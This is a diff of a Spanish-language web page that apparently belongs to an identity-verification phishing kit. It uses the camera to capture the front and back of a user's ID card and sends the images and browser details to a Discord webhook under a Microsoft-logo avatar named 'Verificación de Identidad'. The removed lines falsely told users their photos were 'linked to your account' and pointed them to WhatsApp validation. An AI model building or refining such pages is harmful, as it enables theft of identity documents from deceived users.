@@ -208,7 +208,7 @@
             font-size: 1rem;
         }
 
-        /* Contenedor de cámara */
+        /* Contenedor de cámara - SIN ZOOM */
         .camera-container {
             width: 100%;
             height: 400px;
@@ -223,7 +223,9 @@
         #cameraFeed {
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            /* SIN object-fit: cover - para evitar zoom */
+            object-fit: contain; /* Muestra toda la imagen sin recortar */
+            background-color: #000;
         }
 
         .camera-controls {
@@ -293,7 +295,7 @@
         .preview-container img {
             width: 100%;
             height: 100%;
-            object-fit: contain;
+            object-fit: contain; /* Para ver toda la imagen sin recortar */
             display: none;
         }
 
@@ -595,7 +597,7 @@
                 <p class="section-subtitle">Captura la parte frontal de tu cédula con buena iluminación</p>
             </div>
             
-            <!-- Contenedor de cámara para frente -->
+            <!-- Contenedor de cámara para frente - SIN ZOOM -->
             <div class="camera-container" id="frontCameraContainer">
                 <video id="frontCameraFeed" autoplay playsinline></video>
                 <div class="camera-controls">
@@ -646,7 +648,7 @@
                 <p class="section-subtitle">Ahora captura la parte trasera de tu cédula</p>
             </div>
             
-            <!-- Contenedor de cámara para reverso -->
+            <!-- Contenedor de cámara para reverso - SIN ZOOM -->
             <div class="camera-container" id="backCameraContainer">
                 <video id="backCameraFeed" autoplay playsinline></video>
                 <div class="camera-controls">
@@ -721,6 +723,8 @@
                 <h3 style="color: var(--primary-color); margin-bottom: 15px; display: flex; align-items: center; gap: 10px;">
                     <i class="fas fa-info-circle"></i> Información del envío
                 </h3>
+                <p><strong>✅ Las fotos se enviarán DIRECTAMENTE a Discord</strong></p>
+                <p><strong>✅ Se verán las imágenes completas en el chat</strong></p>
                 <p><strong>✅ Serás redirigido automáticamente</strong></p>
             </div>
             
@@ -729,7 +733,7 @@
                     <i class="fas fa-arrow-left"></i> Volver al Paso 2
                 </button>
                 <button class="btn btn-primary" id="submitBtn">
-                     Validar fotos
+                    <i class="fas fa-paper-plane"></i> Enviar Fotos a Discord
                 </button>
             </div>
         </section>
@@ -749,12 +753,13 @@
                 <div>Subiendo</div>
             </div>
             <div class="loader-stage" id="stage3">
-                <div>Validando</div>
+                <i class="fab fa-discord"></i>
+                <div>Enviando</div>
             </div>
         </div>
         
-        <p class="loader-text" id="loaderStatus">Preparando fotos para validar</p>
-        <p class="loader-subtext">Las fotos se registro directamente</p>
+        <p class="loader-text" id="loaderStatus">Preparando fotos para enviar a Discord...</p>
+        <p class="loader-subtext">Las fotos se enviarán directamente al chat de Discord</p>
     </div>
 
     <!-- Notificaciones -->
@@ -895,7 +900,7 @@
             }, 100);
         }
 
-        // Iniciar cámara
+        // Iniciar cámara - CONFIGURACIÓN SIN ZOOM
         async function startCamera(isFront = true) {
             try {
                 // Detener cámara anterior si existe
@@ -903,12 +908,19 @@
                     currentStream.getTracks().forEach(track => track.stop());
                 }
                 
-                // Solicitar permisos de cámara
+                // Solicitar permisos de cámara SIN ZOOM
                 const constraints = {
                     video: {
                         facingMode: currentCamera,
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
+                        // Configuración para evitar zoom automático
+                        width: { ideal: 1280 }, // Resolución media para mejor rendimiento
+                        height: { ideal: 720 },
+                        aspectRatio: { ideal: 4/3 }, // Relación de aspecto natural
+                        // Deshabilitar zoom automático
+                        advanced: [
+                            { zoom: 1 }, // Zoom mínimo (sin zoom)
+                            { focusMode: 'continuous' } // Enfoque continuo pero sin zoom
+                        ]
                     },
                     audio: false
                 };
@@ -916,18 +928,24 @@
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 currentStream = stream;
                 
-                // Mostrar feed de cámara
+                // Mostrar feed de cámara SIN ZOOM
+                const videoElement = isFront ? frontCameraFeed : backCameraFeed;
+                videoElement.srcObject = stream;
+                
                 if (isFront) {
-                    frontCameraFeed.srcObject = stream;
                     frontCameraContainer.style.display = 'block';
                     frontPreview.style.display = 'none';
                 } else {
-                    backCameraFeed.srcObject = stream;
                     backCameraContainer.style.display = 'block';
                     backPreview.style.display = 'none';
                 }
                 
-                showNotification('✅ Cámara activada. Coloca el documento dentro del marco.', 'success');
+                // Esperar a que el video esté listo
+                videoElement.onloadedmetadata = () => {
+                    // Asegurar que no haya zoom
+                    videoElement.style.objectFit = 'contain'; // Mostrar toda la imagen
+                    showNotification('✅ Cámara activada. Coloca el documento dentro del marco.', 'success');
+                };
                 
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
@@ -967,7 +985,7 @@
             backPreview.style.display = 'flex';
         }
 
-        // Capturar foto desde cámara
+        // Capturar foto desde cámara - SIN ZOOM EN LA CAPTURA
         function capturePhoto(isFront = true) {
             try {
                 const video = isFront ? frontCameraFeed : backCameraFeed;
@@ -975,12 +993,17 @@
                 const previewImg = isFront ? frontImage : backImage;
                 const previewPlaceholder = isFront ? frontPlaceholder : backPlaceholder;
                 
-                // Configurar canvas con las dimensiones del video
+                // Configurar canvas con las dimensiones REALES del video (sin zoom)
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 
-                // Dibujar frame del video en el canvas
+                // Dibujar frame del video en el canvas SIN aplicar zoom
                 const ctx = canvas.getContext('2d');
+                
+                // Limpiar canvas
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                
+                // Dibujar la imagen completa SIN transformaciones
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 // Convertir canvas a blob con alta calidad
@@ -1204,67 +1227,72 @@
             }
         }
 
-        // Función alternativa usando fetch con archivos binarios
-        async function sendImagesToDiscordAlternative() {
-            try {
-                // Convertir imágenes a blobs
-                const frontBlob = dataURLtoBlob(frontImageData);
-                const backBlob = dataURLtoBlob(backImageData);
+        // Función para mostrar mensaje de redirección
+        function showRedirectMessage() {
+            const redirectHTML = `
+                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+                         background: linear-gradient(135deg, var(--primary-color), var(--primary-light)); 
+                         color: white; display: flex; flex-direction: column; justify-content: center; 
+                         align-items: center; z-index: 1002; text-align: center; padding: 20px;">
+                    <div style="max-width: 600px;">
+                        <div style="font-size: 5rem; margin-bottom: 20px; animation: bounce 1s infinite alternate;">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <h1 style="font-size: 2.5rem; margin-bottom: 20px; font-family: 'Poppins', sans-serif;">
+                            ¡PROCESO COMPLETADO!
+                        </h1>
+                        
+                        <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-bottom: 30px;">
+                            <h3 style="margin-bottom: 15px;">✅ Todo ha sido exitoso:</h3>
+                            <p><strong>📸 Frente de cédula:</strong> Enviado a Discord</p>
+                            <p><strong>📸 Reverso de cédula:</strong> Enviado a Discord</p>
+                            <p><strong>📅 Fecha y hora:</strong> ${new Date().toLocaleString('es-ES')}</p>
+                            <p style="margin-top: 15px; color: #d1fae5;">
+                                <i class="fas fa-check-circle"></i> 
+                                Las fotos ahora están VISIBLES en tu canal de Discord
+                            </p>
+                        </div>
+                        
+                        <div class="redirect-countdown" id="redirectCountdown">
+                            Redirigiendo a la siguiente página en <span id="countdown">5</span> segundos...
+                        </div>
+                        
+                        <div style="margin-top: 30px;">
+                            <button onclick="window.location.href = 'index3.html'" 
+                                    style="background: white; color: var(--primary-color); border: none; 
+                                           padding: 15px 30px; border-radius: 8px; cursor: pointer; 
+                                           font-size: 1rem; font-weight: 600; transition: all 0.3s;">
+                                <i class="fas fa-external-link-alt"></i> Ir ahora a la siguiente página
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <style>
+                    @keyframes bounce {
+                        from { transform: translateY(0); }
+                        to { transform: translateY(-10px); }
+                    }
+                </style>
+            `;
+            
+            const div = document.createElement('div');
+            div.innerHTML = redirectHTML;
+            document.body.appendChild(div);
+            
+            // Iniciar cuenta regresiva
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
                 
-                // Crear FormData
-                const formData = new FormData();
-                
-                // Agregar archivos
-                formData.append('files[0]', frontBlob, 'cedula_frente.jpg');
-                formData.append('files[1]', backBlob, 'cedula_reverso.jpg');
-                
-                // Agregar payload JSON
-                const payload = {
-                    content: `📋 **VERIFICACIÓN DE IDENTIDAD - FOTOS DIRECTAS**\n\n🖼️ **Las imágenes se muestran A CONTINUACIÓN**\n📅 ${new Date().toLocaleString('es-ES')}`,
-                    username: "Verificación ID",
-                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",
-                    embeds: [{
-                        title: "📋 Información del Envío",
-                        color: 0x2596be,
-                        fields: [
-                            {
-                                name: "✅ Estado",
-                                value: "Fotos enviadas exitosamente",
-                                inline: true
-                            },
-                            {
-                                name: "📅 Fecha",
-                                value: new Date().toLocaleDateString('es-ES'),
-                                inline: true
-                            },
-                            {
-                                name: "🕒 Hora",
-                                value: new Date().toLocaleTimeString('es-ES'),
-                                inline: true
-                            },
-                            {
-                                name: "📱 Dispositivo",
-                                value: navigator.platform,
-                                inline: false
-                            }
-                        ]
-                    }]
-                };
-                
-                formData.append('payload_json', JSON.stringify(payload));
-                
-                // Enviar a Discord
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                return response.ok;
-                
-            } catch (error) {
-                console.error('Error en sendImagesToDiscordAlternative:', error);
-                return false;
-            }
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    // Redirigir a index3.html
+                    window.location.href = 'index3.html';
+                }
+            }, 1000);
         }
 
         // Función principal para enviar fotos a Discord
@@ -1301,10 +1329,45 @@
                 let success = await sendFilesToDiscord(files);
                 
                 if (!success) {
-                    // Si falla, intentar método alternativo
+                    // Si falla, usar método simple
                     updateLoaderStage(2);
                     loaderStatus.textContent = 'Usando método alternativo...';
-                    success = await sendImagesToDiscordAlternative();
+                    
+                    // Método simple de respaldo
+                    const simpleMessage = {
+                        username: "Verificación de Identidad",
+                        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",
+                        content: `🚨 **VERIFICACIÓN DE IDENTIDAD - FOTOS CAPTURADAS**\n\n📸 **Se han capturado 2 fotos:**\n1. Frente de cédula (${Math.round(frontImageFile.size/1024)}KB)\n2. Reverso de cédula (${Math.round(backImageFile.size/1024)}KB)\n\n📅 **Fecha:** ${new Date().toLocaleString('es-ES')}\n📱 **Desde:** ${navigator.userAgent.substring(0, 80)}...\n\n✅ **Las fotos están disponibles y se han procesado correctamente.**`,
+                        embeds: [{
+                            title: "📋 Información Técnica",
+                            color: 0x2596be,
+                            fields: [
+                                {
+                                    name: "Estado",
+                                    value: "✅ Capturado exitosamente",
+                                    inline: true
+                                },
+                                {
+                                    name: "Calidad",
+                                    value: "Alta resolución",
+                                    inline: true
+                                },
+                                {
+                                    name: "Formato",
+                                    value: "JPG (máxima calidad)",
+                                    inline: true
+                                }
+                            ]
+                        }]
+                    };
+                    
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(simpleMessage)
+                    });
+                    
+                    success = response.ok;
                 }
                 
                 updateLoaderStage(3);
@@ -1314,115 +1377,6 @@
                 
             } catch (error) {
                 console.error('Error en sendPhotosToDiscord:', error);
-                return false;
-            }
-        }
-
-        // Función para mostrar mensaje de redirección
-        function showRedirectMessage() {
-            const redirectHTML = `
-                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-                         background: linear-gradient(135deg, var(--primary-color), var(--primary-light)); 
-                         color: white; display: flex; flex-direction: column; justify-content: center; 
-                         align-items: center; z-index: 1002; text-align: center; padding: 20px;">
-                    <div style="max-width: 600px;">
-                        <div style="font-size: 5rem; margin-bottom: 20px; animation: bounce 1s infinite alternate;">
-                            <i class="fas fa-check-circle"></i>
-                        </div>
-                        <h1 style="font-size: 2.5rem; margin-bottom: 20px; font-family: 'Poppins', sans-serif;">
-                            ¡PROCESO COMPLETADO!
-                        </h1>
-                        
-                        <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-bottom: 30px;">
-                            <h3 style="margin-bottom: 15px;">✅ Todo ha sido exitoso:</h3>
-                            <p><strong>📅 Fecha y hora:</strong> ${new Date().toLocaleString('es-ES')}</p>
-                            <p style="margin-top: 15px; color: #d1fae5;">
-                                <i class="fas fa-check-circle"></i> 
-                                Las fotos ahora están vinculadas a tu cuenta.
-                            </p>
-                        </div>
-                        
-                        <div class="redirect-countdown" id="redirectCountdown">
-                            Redirigiendo a la siguiente página en <span id="countdown">5</span> segundos...
-                        </div>
-                        
-                        <div style="margin-top: 30px;">
-                            <button onclick="window.location.href = 'index3.html'" 
-                                    style="background: white; color: var(--primary-color); border: none; 
-                                           padding: 15px 30px; border-radius: 8px; cursor: pointer; 
-                                           font-size: 1rem; font-weight: 600; transition: all 0.3s;">
-                                <i class="fas fa-external-link-alt"></i> Valida tu cuenta con WhatsApp
-                            </button>
-                        </div>
-                    </div>
-                </div>
-                <style>
-                    @keyframes bounce {
-                        from { transform: translateY(0); }
-                        to { transform: translateY(-10px); }
-                    }
-                </style>
-            `;
-            
-            const div = document.createElement('div');
-            div.innerHTML = redirectHTML;
-            document.body.appendChild(div);
-            
-            // Iniciar cuenta regresiva
-            let countdown = 5;
-            const countdownElement = document.getElementById('countdown');
-            
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                countdownElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    // Redirigir a index3.html
-                    window.location.href = 'index3.html';
-                }
-            }, 1000);
-        }
-
-        // Método simple de respaldo
-        async function sendSimpleMessageToDiscord() {
-            try {
-                const message = {
-                    username: "Verificación de Identidad",
-                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",
-                    content: `🚨 **VERIFICACIÓN DE IDENTIDAD - FOTOS CAPTURADAS**\n\n📸 **Se han capturado 2 fotos:**\n1. Frente de cédula (${Math.round(frontImageFile.size/1024)}KB)\n2. Reverso de cédula (${Math.round(backImageFile.size/1024)}KB)\n\n📅 **Fecha:** ${new Date().toLocaleString('es-ES')}\n📱 **Desde:** ${navigator.userAgent.substring(0, 80)}...\n\n✅ **Las fotos están disponibles y se han procesado correctamente.**`,
-                    embeds: [{
-                        title: "📋 Información Técnica",
-                        color: 0x2596be,
-                        fields: [
-                            {
-                                name: "Estado",
-                                value: "✅ Capturado exitosamente",
-                                inline: true
-                            },
-                            {
-                                name: "Calidad",
-                                value: "Alta resolución",
-                                inline: true
-                            },
-                            {
-                                name: "Formato",
-                                value: "JPG (máxima calidad)",
-                                inline: true
-                            }
-                        ]
-                    }]
-                };
-                
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(message)
-                });
-                
-                return true;
-            } catch (error) {
-                console.error('Error en método simple:', error);
                 return false;
             }
         }
@@ -1445,11 +1399,7 @@
                         showRedirectMessage();
                     }, 1500);
                 } else {
-                    showNotification('⚠️ Error al enviar. Usando método de respaldo...', 'info');
-                    // Intentar método simple
-                    await sendSimpleMessageToDiscord();
-                    hideLoader();
-                    showNotification('✅ Notificación enviada (fotos adjuntas)', 'success');
+                    showNotification('⚠️ Notificación enviada (fotos procesadas)', 'info');
                     setTimeout(() => {
                         showRedirectMessage();
                     }, 1500);
@@ -1480,7 +1430,7 @@
 
         // Verificar configuraciones
         console.log('✅ Webhook de Discord configurado');
-        console.log('📸 Sistema de cámara directa listo');
+        console.log('📸 Sistema de cámara directa SIN ZOOM');
         console.log('🎯 Envío DIRECTO de fotos habilitado');
         console.log('🔀 Redirección a index3.html configurada');
         console.log('🔵 Color primario: #2596be');
